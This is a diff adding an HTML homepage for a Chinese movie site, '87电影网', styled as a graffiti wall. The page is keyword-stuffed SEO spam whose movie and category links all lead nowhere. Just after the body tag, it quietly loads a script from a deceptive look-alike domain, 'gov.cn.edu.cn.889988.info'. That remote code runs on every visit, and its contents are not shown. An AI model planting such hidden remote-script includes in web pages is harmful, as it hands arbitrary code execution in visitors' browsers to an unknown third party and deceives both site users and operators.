@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>87电影网 - 高清电影在线观看_最新影视资源_官方网址 https://87dianyingwang-top.github.io</title>
+    <meta name="keywords" content="87电影网, 电影在线观看, 高清电影, 最新影视, 动作片, 喜剧片, 87dianyingwang-top.github.io">
+    <meta name="description" content="87电影网(87dianyingwang-top.github.io)提供最新高清电影在线观看，涵盖动作、喜剧、科幻、爱情等多种类型，每日更新，界面独特，畅享观影乐趣。">
+    <link rel="canonical" href="https://87dianyingwang-top.github.io">
+    <meta property="og:title" content="87电影网 - 高清电影在线观看">
+    <meta property="og:description" content="提供最新高清电影在线观看，涵盖动作、喜剧、科幻、爱情等多种类型，每日更新。">
+    <meta property="og:url" content="https://87dianyingwang-top.github.io">
+    <meta property="og:type" content="website">
+    <style>
+        /* 街头涂鸦风 */
+        :root {
+            --bg-dark: #1a1a1a;
+            --bg-wall: #2a2a2a;
+            --neon-green: #ccff00;
+            --neon-pink: #ff3399;
+            --neon-blue: #00ffff;
+            --white: #ffffff;
+            --tape: rgba(255, 255, 255, 0.4);
+            --font-graffiti: 'Arial Black', 'Impact', sans-serif;
+            --font-hand: 'Comic Sans MS', 'Marker Felt', cursive;
+            --font-mono: 'Courier New', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: var(--font-hand);
+            background-color: var(--bg-dark);
+            color: var(--white);
+            line-height: 1.6;
+            overflow-x: hidden;
+            padding: 20px;
+            /* 噪点背景 */
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255,255,255,0.05) 1px, transparent 1px),
+                radial-gradient(circle at 80% 70%, rgba(255,255,255,0.05) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        a { text-decoration: none; color: var(--neon-green); transition: all 0.3s ease; }
+        a:hover { color: var(--neon-pink); }
+        ul { list-style: none; }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        /* 喷漆装饰点 */
+        .spray {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(30px);
+            opacity: 0.3;
+            pointer-events: none;
+        }
+        .spray-1 { width: 200px; height: 200px; background: var(--neon-pink); top: 10%; left: 5%; }
+        .spray-2 { width: 150px; height: 150px; background: var(--neon-green); bottom: 20%; right: 10%; }
+
+        /* 头部 */
+        .header {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 30px;
+            background: rgba(26, 26, 26, 0.9);
+            border: 2px solid var(--neon-green);
+            transform: rotate(-1deg);
+            margin-bottom: 40px;
+            box-shadow: 4px 4px 0 var(--neon-pink);
+        }
+        .logo {
+            font-family: var(--font-graffiti);
+            font-size: 2.5rem;
+            color: var(--neon-green);
+            text-transform: uppercase;
+            text-shadow: 3px 3px 0 var(--neon-pink);
+            transform: rotate(2deg);
+        }
+        .logo span { color: var(--neon-pink); }
+        .nav-menu { display: flex; gap: 15px; flex-wrap: wrap; }
+        .nav-menu a {
+            padding: 8px 16px;
+            background: var(--white);
+            color: var(--bg-dark);
+            font-family: var(--font-graffiti);
+            font-weight: bold;
+            font-size: 0.9rem;
+            transform: rotate(-3deg);
+            border: 2px solid transparent;
+        }
+        .nav-menu a:nth-child(even) { transform: rotate(2deg); background: var(--neon-green); }
+        .nav-menu a:hover { 
+            background: var(--neon-pink); 
+            color: var(--white); 
+            transform: rotate(0deg) scale(1.1); 
+            border-color: var(--white);
+        }
+
+        /* Hero */
+        .hero {
+            position: relative;
+            z-index: 5;
+            padding: 80px 40px;
+            text-align: center;
+            background: var(--bg-wall);
+            border: 3px dashed var(--neon-blue);
+            transform: rotate(1deg);
+            margin-bottom: 60px;
+            overflow: hidden;
+        }
+        .hero::before {
+            content: '87';
+            position: absolute;
+            top: -20px; left: -10px;
+            font-family: var(--font-graffiti);
+            font-size: 15rem;
+            color: rgba(255, 255, 255, 0.03);
+            z-index: 0;
+        }
+        .hero h1 {
+            font-family: var(--font-graffiti);
+            font-size: clamp(3rem, 8vw, 5rem);
+            color: var(--white);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            text-shadow: 4px 4px 0 var(--neon-pink), -2px -2px 0 var(--neon-green);
+            transform: rotate(-2deg);
+            position: relative;
+            z-index: 2;
+        }
+        .hero h1 span { color: var(--neon-green); }
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--white);
+            max-width: 600px;
+            margin: 0 auto 30px;
+            background: var(--neon-pink);
+            padding: 10px 20px;
+            transform: rotate(1deg);
+            position: relative;
+            z-index: 2;
+            font-family: var(--font-hand);
+        }
+        .url-box {
+            display: inline-block;
+            padding: 15px 30px;
+            background: var(--neon-green);
+            color: var(--bg-dark);
+            font-family: var(--font-mono);
+            font-weight: bold;
+            font-size: 1.1rem;
+            transform: rotate(-1deg);
+            box-shadow: 4px 4px 0 var(--white);
+            position: relative;
+            z-index: 2;
+        }
+        .url-box a { color: var(--bg-dark); text-decoration: underline; }
+        .btn-main {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 15px 40px;
+            background: var(--neon-pink);
+            color: var(--white);
+            font-family: var(--font-graffiti);
+            font-size: 1.5rem;
+            text-transform: uppercase;
+            transform: rotate(3deg);
+            box-shadow: 5px 5px 0 var(--neon-green);
+            position: relative;
+            z-index: 2;
+        }
+        .btn-main:hover { 
+            transform: rotate(0deg) scale(1.05); 
+            background: var(--neon-green); 
+            color: var(--bg-dark); 
+            box-shadow: 5px 5px 0 var(--neon-pink); 
+        }
+
+        /* 通用栏目 */
+        .section { position: relative; z-index: 5; padding: 60px 0; }
+        .section-title {
+            font-family: var(--font-graffiti);
+            font-size: 2.5rem;
+            color: var(--neon-green);
+            margin-bottom: 40px;
+            text-transform: uppercase;
+            text-shadow: 2px 2px 0 var(--neon-pink);
+            transform: rotate(-1deg);
+            display: inline-block;
+            background: var(--bg-dark);
+            padding: 10px 20px;
+            border: 2px solid var(--neon-green);
+        }
+
+        /* 栏目1：最新电影（拍立得照片墙） */
+        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; }
+        .polaroid {
+            background: var(--white);
+            padding: 15px 15px 40px 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            transform: rotate(2deg);
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        .polaroid:nth-child(even) { transform: rotate(-2deg); }
+        .polaroid:nth-child(3n) { transform: rotate(1deg); }
+        .polaroid:hover { 
+            transform: rotate(0deg) scale(1.05); 
+            box-shadow: 0 10px 25px rgba(204, 255, 0, 0.3); 
+        }
+        /* 胶带效果 */
+        .polaroid::before {
+            content: '';
+            position: absolute;
+            top: -10px; left: 50%;
+            transform: translateX(-50%) rotate(-3deg);
+            width: 80px; height: 25px;
+            background: var(--tape);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .polaroid-img {
+            width: 100%;
+            height: 200px;
+            background: var(--bg-wall);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 4rem;
+            color: var(--neon-green);
+            margin-bottom: 15px;
+        }
+        .polaroid-title { 
+            font-family: var(--font-graffiti); 
+            font-size: 1.1rem; 
+            color: var(--bg-dark); 
+            text-align: center; 
+            margin-bottom: 5px;
+        }
+        .polaroid-meta { 
+            font-family: var(--font-hand); 
+            font-size: 0.9rem; 
+            color: #666; 
+            text-align: center; 
+        }
+
+        /* 栏目2：电影分类（便利贴） */
+        .sticky-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; }
+        .sticky-note {
+            padding: 25px 20px;
+            font-family: var(--font-hand);
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-align: center;
+            transform: rotate(-2deg);
+            box-shadow: 2px 2px 5px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        .sticky-note:nth-child(even) { transform: rotate(2deg); }
+        .sticky-note:nth-child(3n) { transform: rotate(-1deg); }
+        .sticky-1 { background: #ffeb3b; color: #333; }
+        .sticky-2 { background: #ff9800; color: #fff; }
+        .sticky-3 { background: #e91e63; color: #fff; }
+        .sticky-4 { background: #00bcd4; color: #fff; }
+        .sticky-5 { background: #8bc34a; color: #fff; }
+        .sticky-6 { background: #9c27b0; color: #fff; }
+        .sticky-7 { background: #f44336; color: #fff; }
+        .sticky-8 { background: #3f51b5; color: #fff; }
+        .sticky-note:hover { 
+            transform: rotate(0deg) scale(1.1); 
+            z-index: 10; 
+            box-shadow: 5px 5px 15px rgba(0,0,0,0.3); 
+        }
+
+        /* 栏目3：排行榜（手写清单） */
+        .list-container {
+            background: rgba(255,255,255,0.05);
+            border: 2px solid var(--neon-blue);
+            padding: 40px;
+            transform: rotate(1deg);
+        }
+        .list-item {
+            display: flex;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px dashed rgba(255,255,255,0.2);
+            gap: 20px;
+            font-family: var(--font-hand);
+            font-size: 1.2rem;
+        }
+        .list-item:last-child { border-bottom: none; }
+        .list-num {
+            font-family: var(--font-graffiti);
+            font-size: 2rem;
+            color: var(--neon-pink);
+            min-width: 50px;
+            text-shadow: 2px 2px 0 var(--neon-green);
+        }
+        .list-title { flex: 1; color: var(--white); }
+        .list-score { 
+            font-family: var(--font-mono); 
+            font-weight: bold; 
+            color: var(--neon-green); 
+            background: var(--bg-dark);
+            padding: 5px 10px;
+            border: 1px solid var(--neon-green);
+        }
+
+        /* 栏目4：关于本站（海报墙） */
+        .poster-box {
+            background: var(--neon-pink);
+            color: var(--white);
+            padding: 50px 40px;
+            text-align: center;
+            transform: rotate(-1deg);
+            border: 3px solid var(--white);
+            box-shadow: 10px 10px 0 var(--neon-green);
+        }
+        .poster-box h2 {
+            font-family: var(--font-graffiti);
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            text-shadow: 3px 3px 0 var(--bg-dark);
+        }
+        .poster-box p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            font-family: var(--font-hand);
+        }
+        .about-url {
+            display: inline-block;
+            padding: 20px 40px;
+            background: var(--bg-dark);
+            color: var(--neon-green);
+            font-family: var(--font-mono);
+            font-size: 1.3rem;
+            font-weight: bold;
+            transform: rotate(2deg);
+            border: 2px dashed var(--neon-green);
+        }
+        .about-url a { color: var(--neon-green); }
+
+        /* 页脚 */
+        .footer {
+            position: relative;
+            z-index: 5;
+            text-align: center;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 2px dashed var(--neon-pink);
+        }
+        .footer-logo {
+            font-family: var(--font-graffiti);
+            font-size: 2rem;
+            color: var(--neon-green);
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 0 var(--neon-pink);
+        }
+        .footer-links { display: flex; justify-content: center; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }
+        .footer-links a {
+            color: var(--white);
+            font-family: var(--font-hand);
+            font-size: 1.1rem;
+            padding: 8px 16px;
+            background: rgba(255,255,255,0.1);
+            transform: rotate(-2deg);
+        }
+        .footer-links a:hover { background: var(--neon-green); color: var(--bg-dark); transform: rotate(0deg); }
+        .copyright {
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            color: var(--white);
+            line-height: 1.8;
+            opacity: 0.7;
+        }
+        .copyright a { color: var(--neon-pink); }
+
+        /* 响应式 */
+        @media (max-width: 1024px) {
+            .grid-3 { grid-template-columns: repeat(2, 1fr); }
+            .sticky-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+            .header { flex-direction: column; gap: 20px; padding: 20px; transform: none; }
+            .nav-menu { justify-content: center; }
+            .hero { padding: 40px 20px; transform: none; }
+            .section { padding: 40px 0; }
+            .grid-3 { grid-template-columns: 1fr; }
+            .sticky-grid { grid-template-columns: 1fr; }
+            .list-container { padding: 20px; transform: none; }
+            .list-item { flex-direction: column; text-align: center; gap: 10px; }
+            .poster-box { padding: 30px 20px; transform: none; }
+            .hero h1, .section-title, .btn-main, .url-box { transform: none; }
+            .polaroid { transform: none !important; }
+            .sticky-note { transform: none !important; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+    <div class="spray spray-1"></div>
+    <div class="spray spray-2"></div>
+    <div class="container">
+        <!-- 头部 -->
+        <header class="header">
+            <div class="logo">87<span>电影网</span></div>
+            <nav>
+                <ul class="nav-menu">
+                    <li><a href="#new">最新电影</a></li>
+                    <li><a href="#types">电影分类</a></li>
+                    <li><a href="#ranking">排行榜</a></li>
+                    <li><a href="#about">关于本站</a></li>
+                </ul>
+            </nav>
+        </header>
+
+        <main>
+            <!-- Hero -->
+            <section class="hero">
+                <h1>87电影网<br><span>随便看看</span></h1>
+                <p>不用想太多，随便挑一部，开心就好！</p>
+                <div class="url-box">
+                    🔗 官方网址：<a href="https://87dianyingwang-top.github.io">https://87dianyingwang-top.github.io</a>
+                </div>
+                <br>
+                <a href="#" class="btn-main">开始乱看 #</a>
+            </section>
+
+            <!-- 栏目1：最新电影（拍立得） -->
+            <section id="new" class="section">
+                <h2 class="section-title">📸 最新上架</h2>
+                <div class="grid-3">
+                    <div class="polaroid">
+                        <div class="polaroid-img">🎬</div>
+                        <div class="polaroid-title"><a href="#">疯狂的麦克斯</a></div>
+                        <div class="polaroid-meta">动作 / 科幻 · 2015</div>
+                    </div>
+                    <div class="polaroid">
+                        <div class="polaroid-img">🤡</div>
+                        <div class="polaroid-title"><a href="#">小丑</a></div>
+                        <div class="polaroid-meta">剧情 / 犯罪 · 2019</div>
+                    </div>
+                    <div class="polaroid">
+                        <div class="polaroid-img">🚀</div>
+                        <div class="polaroid-title"><a href="#">火星救援</a></div>
+                        <div class="polaroid-meta">冒险 / 科幻 · 2015</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 栏目2：电影分类（便利贴） -->
+            <section id="types" class="section">
+                <h2 class="section-title">🏷️ 随便挑个类型</h2>
+                <div class="sticky-grid">
+                    <a href="#" class="sticky-note sticky-1">😂 喜剧片</a>
+                    <a href="#" class="sticky-note sticky-2">💥 动作片</a>
+                    <a href="#" class="sticky-note sticky-3">👽 科幻片</a>
+                    <a href="#" class="sticky-note sticky-4">😱 恐怖片</a>
+                    <a href="#" class="sticky-note sticky-5">💖 爱情片</a>
+                    <a href="#" class="sticky-note sticky-6">🕵️ 悬疑片</a>
+                    <a href="#" class="sticky-note sticky-7">🎭 剧情片</a>
+                    <a href="#" class="sticky-note sticky-8">🤠 动画片</a>
+                </div>
+            </section>
+
+            <!-- 栏目3：排行榜（手写清单） -->
+            <section id="ranking" class="section">
+                <h2 class="section-title">📝 大家都在看</h2>
+                <div class="list-container">
+                    <div class="list-item">
+                        <div class="list-num">1</div>
+                        <div class="list-title"><a href="#">肖申克的救赎</a></div>
+                        <div class="list-score">9.7</div>
+                    </div>
+                    <div class="list-item">
+                        <div class="list-num">2</div>
+                        <div class="list-title"><a href="#">阿甘正传</a></div>
+                        <div class="list-score">9.5</div>
+                    </div>
+                    <div class="list-item">
+                        <div class="list-num">3</div>
+                        <div class="list-title"><a href="#">泰坦尼克号</a></div>
+                        <div class="list-score">9.4</div>
+                    </div>
+                    <div class="list-item">
+                        <div class="list-num">4</div>
+                        <div class="list-title"><a href="#">盗梦空间</a></div>
+                        <div class="list-score">9.3</div>
+                    </div>
+                    <div class="list-item">
+                        <div class="list-num">5</div>
+                        <div class="list-title"><a href="#">星际穿越</a></div>
+                        <div class="list-score">9.3</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 栏目4：关于本站（海报） -->
+            <section id="about" class="section">
+                <div class="poster-box">
+                    <h2>关于 87电影网</h2>
+                    <p>87电影网是一个随性、自由、无压力的在线电影推荐平台。没有复杂的算法，没有强制的推荐，只有海量好片等你来“随便看”。</p>
+                    <p>记住我们的网址，随时开启观影模式！</p>
+                    <div class="about-url">
+                        官方唯一网址：<br><br>
+                        <a href="https://87dianyingwang-top.github.io">https://87dianyingwang-top.github.io</a>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <!-- 页脚 -->
+        <footer class="footer">
+            <div class="footer-logo">87电影网</div>
+            <div class="footer-links">
+                <a href="#">网站首页 #</a>
+                <a href="#">免责声明 #</a>
+                <a href="#">留言反馈 #</a>
+                <a href="#">合作联系 #</a>
+            </div>
+            <div class="copyright">
+                <p>Copyright © 2024 87电影网 | 关键词：87电影网</p>
+                <p>官方网址：<a href="https://87dianyingwang-top.github.io">https://87dianyingwang-top.github.io</a></p>
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
